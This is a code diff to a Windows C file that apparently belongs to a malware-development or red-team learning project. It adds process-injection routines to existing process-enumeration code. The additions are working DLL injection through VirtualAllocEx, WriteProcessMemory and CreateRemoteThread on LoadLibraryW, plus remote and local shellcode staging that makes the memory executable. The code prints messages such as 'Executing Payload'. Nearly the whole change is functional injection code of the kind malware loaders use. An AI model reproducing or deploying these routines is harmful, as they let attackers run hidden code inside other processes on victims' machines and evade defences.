@@ -4,7 +4,7 @@
 #include <Tlhelp32.h>
 #include "../include/process.h"
 
-
+// PROCESS ENUM ========================================================================== 
 BOOL PrintProcesses() {
 
 	DWORD		adwProcesses[1024 * 2],
@@ -131,6 +131,7 @@ BOOL GetRemoteProcessHandleEnum(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HA
 	else
 		return TRUE;
 }
+
 BOOL GetRemoteProcessHandleNt(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {
 
 	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
@@ -201,6 +202,7 @@ BOOL GetRemoteProcessHandleNt(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HAND
 	else
 		return TRUE;
 }
+
 BOOL GetRemoteProcessHandleSnapshot(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
 
 	HANDLE			hSnapShot = NULL;
@@ -262,11 +264,122 @@ BOOL GetRemoteProcessHandleSnapshot(LPWSTR szProcessName, DWORD* dwProcessId, HA
 
 
 
-_EndOfFunction:
-	if (hSnapShot != NULL)
-		CloseHandle(hSnapShot);
-	if (*dwProcessId == NULL || *hProcess == NULL)
+	_EndOfFunction:
+		if (hSnapShot != NULL)
+			CloseHandle(hSnapShot);
+		if (*dwProcessId == NULL || *hProcess == NULL)
+			return FALSE;
+		return TRUE;
+}
+
+
+// PROCESS INJECTION ========================================================================== 
+BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
+
+	BOOL		bSTATE = TRUE;
+
+	LPVOID		pLoadLibraryW = NULL;
+	LPVOID		pAddress = NULL;
+
+	DWORD		dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
+
+	SIZE_T		lpNumberOfBytesWritten = NULL;
+
+	HANDLE		hThread = NULL;
+
+	// Getting the base address of LoadLibraryW function
+	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+	if (pLoadLibraryW == NULL) {
+		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+	// Allocating memory in hProcess of size dwSizeToWrite and memory permissions set to read and write
+	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pAddress == NULL) {
+		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	printf("[i] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
+	printf("[#] Press <Enter> To Write ... ");
+	getchar();
+
+	// Writing DllName to the allocated memory pAddress
+	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
+		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+
+	printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
+	printf("[#] Press <Enter> To Run ... ");
+	getchar();
+
+	// Running LoadLibraryW in a new thread, passing pAddress as a parameter which contains the DLL name
+	printf("[i] Executing Payload ... ");
+	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
+	if (hThread == NULL) {
+		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
+		bSTATE = FALSE; goto _EndOfFunction;
+	}
+	printf("[+] DONE !\n");
+
+
+	_EndOfFunction:
+		if (hThread)
+			CloseHandle(hThread);
+		return bSTATE;
+}
+
+BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
+
+	SIZE_T	sNumberOfBytesWritten = NULL;
+	DWORD	dwOldProtection = NULL;
+
+	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (*ppAddress == NULL) {
+		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
+	}
+	printf("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);
+
+
+	printf("\t[#] Press <Enter> To Write Payload ... ");
+	getchar();
+	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+		printf("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	printf("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
+
+
+	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		printf("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+
 	return TRUE;
 }
 
+BOOL InjectShellcodeToLocalProcess(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {
+
+	DWORD	dwOldProtection = NULL;
+
+	*ppAddress = VirtualAlloc(NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (*ppAddress == NULL) {
+		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	printf("\t[i] Allocated Memory At : 0x%p \n", *ppAddress);
+
+
+	memcpy(*ppAddress, pShellcode, sSizeOfShellcode);
+
+
+	if (!VirtualProtect(*ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
+		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	return TRUE;
+}
